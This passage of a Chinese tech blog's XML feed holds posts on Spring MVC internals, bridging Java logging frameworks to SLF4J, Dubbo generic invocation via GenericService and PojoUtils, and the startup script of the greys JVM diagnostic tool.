-&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@625dde2e&quot;</span><br><span class="line">     99 = &#123;LinkedHashMap$Entry@6696&#125; &quot;java.lang.String -&gt; java.time.ZonedDateTime&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.time.ZonedDateTime: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.lang.String -&gt; java.time.ZonedDateTime: org.springframework.format.datetime.standard.TemporalAccessorParser@5cb87626&quot;</span><br><span class="line">   converterCache = &#123;ConcurrentReferenceHashMap@6591&#125;  size = 1</span><br><span class="line">    0 = &#123;ConcurrentReferenceHashMap$Entry@7099&#125; &quot;ConverterCacheKey [sourceType = java.lang.String, targetType = @org.springframework.web.bind.annotation.RequestParam java.lang.String]&quot; -&gt; &quot;NO_OP&quot;</span><br><span class="line">  propertyEditorRegistrars = null</span><br></pre></td></tr></table></figure>
<h3 id="parameterNameDiscoverer"><a href="#parameterNameDiscoverer" class="headerlink" title="parameterNameDiscoverer"></a>parameterNameDiscoverer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">this.parameterNameDiscoverer = &#123;DefaultParameterNameDiscoverer@4866&#125; </span><br><span class="line"> parameterNameDiscoverers = &#123;LinkedList@7309&#125;  size = 2</span><br><span class="line">  0 = &#123;StandardReflectionParameterNameDiscoverer@7311&#125; </span><br><span class="line">  1 = &#123;LocalVariableTableParameterNameDiscoverer@7312&#125;</span><br></pre></td></tr></table></figure>
<p>容器的启动过程以及一次请求的详细处理过程: <a href="springmvc.log">启动日志</a></p>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spring mvc </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[将其他日志框架桥接到slf4j]]></title>
      <url>http://qsli.github.io/2018/05/05/slf4j-bridge/</url>
      <content type="html"><![CDATA[<h2 id="SLF4J"><a href="#SLF4J" class="headerlink" title="SLF4J"></a>SLF4J</h2><p>java世界的日志框架太多了, <code>Jakarta Commons Logging (JCL)</code>,  java.util.logging (jul), Log4j, Logback等等. 其中 log4j和logback是同一个作者写的, 这个作者为了统一日志的API, 又创作了SLF4J, SLF4J采用门面模式定义了日志操作的API, 但是并没有提供实现,<br>具体的实现由用户引入的jar包决定, 比如Log4j或者Logback等.</p>
<p>为了能让之前的项目, 比如一个比较古老的项目使用了 JCL, 也能使用<code>SLF4J</code>带来的好处(接口和实现分离), 就出现了桥接的需求.</p>
<p> <img src="https://www.slf4j.org/images/legacy.png" alt></p>
<p> 一旦桥接到了<code>SLF4J</code>, 底层的日志实现就可以随便选了.</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p> 这里拿<code>JCL</code>为例, 介绍下如何使用桥接包.</p>
<ol>
<li>exclude掉<code>JCL</code>对应的jar包</li>
<li>引入<code>jcl-over-slf4j</code></li>
</ol>
<p>比如拿<code>spring mvc</code>为例, 他内部使用的是<code>JCL</code>作为日志实现, 我们需要做的就是:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--exclude--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;sl4j.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.slf4j/jcl-over-slf4j --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jcl-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>桥接的实现原理就是不引入<code>JCL</code>等之前包的实现, 在桥接的jar包中实现一套相同的api.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  jcl-over-slf4j-1.7.25-sources  tree</span><br><span class="line">.</span><br><span class="line">├── META-INF</span><br><span class="line">│   ├── MANIFEST.MF</span><br><span class="line">│   └── services</span><br><span class="line">│       └── org.apache.commons.logging.LogFactory</span><br><span class="line">└── org</span><br><span class="line">    └── apache</span><br><span class="line">        └── commons</span><br><span class="line">            └── logging</span><br><span class="line">                ├── impl</span><br><span class="line">                │   ├── NoOpLog.java</span><br><span class="line">                │   ├── package.html</span><br><span class="line">                │   ├── SimpleLog.java</span><br><span class="line">                │   ├── SLF4JLocationAwareLog.java</span><br><span class="line">                │   ├── SLF4JLogFactory.java</span><br><span class="line">                │   └── SLF4JLog.java</span><br><span class="line">                ├── LogConfigurationException.java</span><br><span class="line">                ├── LogFactory.java</span><br><span class="line">                ├── Log.java</span><br><span class="line">                └── package.html</span><br></pre></td></tr></table></figure>
<p>在<code>LogFactory</code>中使用的是<code>SLF4JLogFactory</code>来获取<code>Logger</code>, 最终用到的是<code>slf4j-api</code>中定义的方法.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.apache.commons.logging.LogFactory</span></span><br><span class="line"><span class="keyword">static</span> LogFactory logFactory = <span class="keyword">new</span> SLF4JLogFactory();</span><br><span class="line"></span><br><span class="line"><span class="comment">// org.apache.commons.logging.impl.SLF4JLogFactory#getInstance(java.lang.String)</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Log <span class="title">getInstance</span><span class="params">(String name)</span> <span class="keyword">throws</span> LogConfigurationException </span>&#123;</span><br><span class="line">        Log instance = loggerMap.get(name);</span><br><span class="line">        <span class="keyword">if</span> (instance != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> instance;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Log newInstance;</span><br><span class="line">            Logger slf4jLogger = LoggerFactory.getLogger(name);</span><br><span class="line">            <span class="keyword">if</span> (slf4jLogger <span class="keyword">instanceof</span> LocationAwareLogger) &#123;</span><br><span class="line">                newInstance = <span class="keyword">new</span> SLF4JLocationAwareLog((LocationAwareLogger) slf4jLogger);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                newInstance = <span class="keyword">new</span> SLF4JLog(slf4jLogger);</span><br><span class="line">            &#125;</span><br><span class="line">            Log oldInstance = loggerMap.putIfAbsent(name, newInstance);</span><br><span class="line">            <span class="keyword">return</span> oldInstance == <span class="keyword">null</span> ? newInstance : oldInstance;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.slf4j.org/legacy.html" rel="external nofollow noopener noreferrer" target="_blank">Log4j Bridge</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/24272450" rel="external nofollow noopener noreferrer" target="_blank">Java 日志框架解析(上) - 历史演进</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/24275518" rel="external nofollow noopener noreferrer" target="_blank">Java 日志框架解析(下) - 最佳实践</a></li>
<li><a href="http://tech.lede.com/2017/02/06/rd/server/log4jSearch/index.html" rel="external nofollow noopener noreferrer" target="_blank">日志工具现状调研 | 网易乐得技术团队</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> logback </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[dubbo泛化调用原理]]></title>
      <url>http://qsli.github.io/2018/05/02/dubbo-generic-invoke/</url>
      <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote>
<p>泛接口调用方式主要用于客户端没有API接口及模型类元的情况，参数及返回值中的所有POJO均用Map表示，通常用于框架集成，比如：实现一个通用的服务测试框架，可通过GenericService调用所有服务实现。</p>
</blockquote>
<p>截图为qunar的dubbo服务测试框架, 只需将参数按照指定的格式填入, 就可以直接调用相应的dubbo接口.</p>
<img src="/2018/05/02/dubbo-generic-invoke/generic.png" title="通过泛化调用手工发起dubbo请求">
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>泛化调用需要接口声明为泛化, 可以在声明接口的时候指定,</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:reference</span> <span class="attr">id</span>=<span class="string">"barService"</span> <span class="attr">interface</span>=<span class="string">"com.foo.BarService"</span> <span class="attr">generic</span>=<span class="string">"true"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>也可以在代码中进行设置:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ReferenceConfig&lt;GenericService&gt; reference = <span class="keyword">new</span> ReferenceConfig&lt;GenericService&gt;();</span><br><span class="line">reference.setApplication(<span class="keyword">new</span> ApplicationConfig(<span class="string">"generic-consumer"</span>));</span><br><span class="line">reference.setInterface(DemoService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">reference.setUrl(<span class="string">"dubbo://127.0.0.1:29581?scope=remote"</span>);</span><br><span class="line"><span class="comment">// 声明为泛化</span></span><br><span class="line">reference.setGeneric(<span class="keyword">true</span>);</span><br><span class="line">GenericService genericService = reference.get();</span><br></pre></td></tr></table></figure>
<p>然后就可以使用泛化调用的方式去调用接口了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Map&lt;String, Object&gt;&gt; users = <span class="keyword">new</span> ArrayList&lt;Map&lt;String, Object&gt;&gt;();</span><br><span class="line">Map&lt;String, Object&gt; user = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">user.put(<span class="string">"class"</span>, <span class="string">"com.alibaba.dubbo.config.api.User"</span>);</span><br><span class="line">user.put(<span class="string">"name"</span>, <span class="string">"actual.provider"</span>);</span><br><span class="line">users.add(user);</span><br><span class="line"><span class="comment">// 泛化调用</span></span><br><span class="line">users = (List&lt;Map&lt;String, Object&gt;&gt;) genericService.$invoke("getUsers", new String[] &#123;List.class.getName()&#125;, new Object[] &#123;users&#125;);</span><br><span class="line">Assert.assertEquals(<span class="number">1</span>, users.size());</span><br><span class="line">Assert.assertEquals(<span class="string">"actual.provider"</span>, users.get(<span class="number">0</span>).get(<span class="string">"name"</span>));</span><br></pre></td></tr></table></figure>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>泛化调用是通过dubbo的filter机制实现的, 大概流程如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">+-------------------------------------------+               +-------------------------------------------+</span><br><span class="line">|  consumer 端                               |               | provider 端                                |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                    +------------------+   |               |       +--------------+                    |</span><br><span class="line">|                    |GenericImplFilter |   |  Invocation   |       |GenericFilter |                    |</span><br><span class="line">|             +----&gt; |                  +-------------------------&gt; |              |                    |</span><br><span class="line">|             |      +------------------+   |               |       +--------------+                    |</span><br><span class="line">| +-----------+                             |               |                      |    +-----------+   |</span><br><span class="line">| |           |                             |               |                      |    |           |   |</span><br><span class="line">| |Client     |                             |               |                      +--&gt; | Service   |   |</span><br><span class="line">| |           |                             |               |                           |           |   |</span><br><span class="line">| +-----------+                             |               |                           +-------+---+   |</span><br><span class="line">|                                           |               |                                   |       |</span><br><span class="line">|      ^             +------------------+   |               |       +--------------+            |       |</span><br><span class="line">|      |             |GenericImplFilter |   |               |       |GenericFilter | &lt;----------+       |</span><br><span class="line">|      +-------------+                  | &lt;-------------------------+              |                    |</span><br><span class="line">|                    +------------------+   |               |       +--------------+                    |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">|                                           |               |                                           |</span><br><span class="line">+-------------------------------------------+               +-------------------------------------------+</span><br></pre></td></tr></table></figure>
<h3 id="GenericService"><a href="#GenericService" class="headerlink" title="GenericService"></a>GenericService</h3><p><code>GenericService</code>这个接口和java的反射调用非常像, 只需提供调用的方法名称,  参数的类型以及参数的值就可以直接调用对应方法了.</p>
<p>接口的实现如下:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.alibaba.dubbo.rpc.service;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通用服务接口</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> william.liangf</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@export</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">GenericService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 泛化调用</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> method 方法名，如：findPerson，如果有重载方法，需带上参数列表，如：findPerson(java.lang.String)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> parameterTypes 参数类型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args 参数列表</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Throwable 方法抛出的异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Object $invoke(String method, String[] parameterTypes, Object[] args) <span class="keyword">throws</span> GenericException;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="PojoUtils"><a href="#PojoUtils" class="headerlink" title="PojoUtils"></a>PojoUtils</h3><blockquote>
<p>PojoUtils. Travel object deeply, and convert complex type to simple type.</p>
</blockquote>
<p>simple type包含primitive type, String, Number(Integer, Long), Date, Array of Primitive type, collection等</p>
<p>举一个简单的例子, java类User定义如下:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span>  String name;</span><br><span class="line">    <span class="keyword">private</span> Date birthDay;</span><br><span class="line">    <span class="keyword">private</span> Address address;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(<span class="keyword">int</span> age, String name, Date birthDay)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.birthDay = birthDay;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Date <span class="title">getBirthDay</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> birthDay;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBirthDay</span><span class="params">(Date birthDay)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.birthDay = birthDay;</span><br><span class="line">    &#125;</span><br><span class="line">将hashmap结构的参数转换成对应的pojo</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Address <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAddress</span><span class="params">(Address address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ReflectionToStringBuilder.toString(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;￼￼ ￼ ￼ ￼ ￼ ￼￼</span><br></pre></td></tr></table></figure>
<p>序列化代码:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object generalized = PojoUtils.generalize(user);</span><br><span class="line"> System.out.println(<span class="string">"generalized = "</span> + JSON.toJSONString(generalized));</span><br></pre></td></tr></table></figure>
<p>generalize之后其实是一个<code>hashmap</code>, 写成json字符串之后如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;birthDay&quot;: 1525258281516,</span><br><span class="line">    &quot;address&quot;: &#123;</span><br><span class="line">        &quot;zipCode&quot;: 10086,</span><br><span class="line">        &quot;street&quot;: &quot;haidian street&quot;,</span><br><span class="line">        &quot;class&quot;: &quot;com.air.rmi.dubbo.bean.Address&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;name&quot;: &quot;Kevin&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;com.air.rmi.dubbo.bean.User&quot;,</span><br><span class="line">    &quot;age&quot;: 26</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="相关filters"><a href="#相关filters" class="headerlink" title="相关filters"></a>相关filters</h3><ul>
<li><code>GenericFilter</code>: 负责provider端参数的转换.</li>
</ul>
<ol>
<li>调用时,将hashmap结构的参数转换成对应的pojo</li>
<li>返回结果时, 将pojo转换成hashmap</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调用时</span></span><br><span class="line">args = PojoUtils.realize(args, params, method.getGenericParameterTypes()</span><br><span class="line"><span class="comment">// 返回结果时</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> RpcResult(PojoUtils.generalize(result.getValue()));</span><br></pre></td></tr></table></figure>
<ul>
<li><code>GenericImplFilter</code>: 负责consumer端参数的转换, 将POJO转换成hashmap结构</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object[] args = PojoUtils.generalize(arguments);</span><br></pre></td></tr></table></figure>
<p>这样consumer端传过来的只是一个map, 并不要有provider端的jar包, 根据这个就可以实现dubbo接口的测试平台.</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://dubbo.incubator.apache.org/books/dubbo-user-book/demos/generic-reference.html" rel="external nofollow noopener noreferrer" target="_blank">6.16 泛化引用 · GitBook</a></li>
<li><a href="https://www.jianshu.com/p/ff0947529de4" rel="external nofollow noopener noreferrer" target="_blank">Dubbo高级特性实践-泛化调用 - 简书</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/29410596" rel="external nofollow noopener noreferrer" target="_blank">dubbo高级用法之泛化与接口自适应</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> dubbo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> generic </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[greys启动分析]]></title>
      <url>http://qsli.github.io/2018/04/02/greys-start/</url>
      <content type="html"><![CDATA[<h1 id="greys-简介"><a href="#greys-简介" class="headerlink" title="greys 简介"></a>greys 简介</h1><p>greys的使用参见链接： <a href="/2017/11/12/greys/" title="使用greys来排查线上问题">使用greys来排查线上问题</a></p>
<h1 id="greys-sh"><a href="#greys-sh" class="headerlink" title="greys.sh"></a>greys.sh</h1><p>一般使用greys时，启动命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u tomcat -H ./greys.sh [pid]</span><br></pre></td></tr></table></figure>
<p><code>greys.sh</code>的最后一行<code>main &quot;${@}&quot;</code>将命令行的所有参数都传给了main函数， 看main函数的实现：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">"PUJC"</span> ARG</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$&#123;ARG&#125;</span> <span class="keyword">in</span></span><br><span class="line">        P) OPTION_CHECK_PERMISSION=0;;</span><br><span class="line">        U) OPTION_UPDATE_IF_NECESSARY=0;;</span><br><span class="line">        J) OPTION_ATTACH_JVM=0;;</span><br><span class="line">        C) OPTION_ACTIVE_CONSOLE=0;;</span><br><span class="line">        ?) usage;<span class="built_in">exit</span> 1;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>首先脚本使用<code>getopts</code>来获取命令行的参数， 指定解析<code>-P</code>、<code>-U</code>、<code>-J</code>、<code>-C</code>这几个参数，设置一些flag。<br>注意下case语句中的<code>？</code>， 代表无法识别的命令行参数, 这时就打印出help，然后退出程序：</p>
<blockquote>
<p>The GNU getopt command uses the GNU getopt() library function to do the parsing of the arguments and options.</p>
</blockquote>
<blockquote>
<p>If getopt() does not recognize an option character, it prints an error message to stderr, stores the character in optopt, and returns ?. The calling program may prevent the error message by setting opterr to 0.</p>
</blockquote>
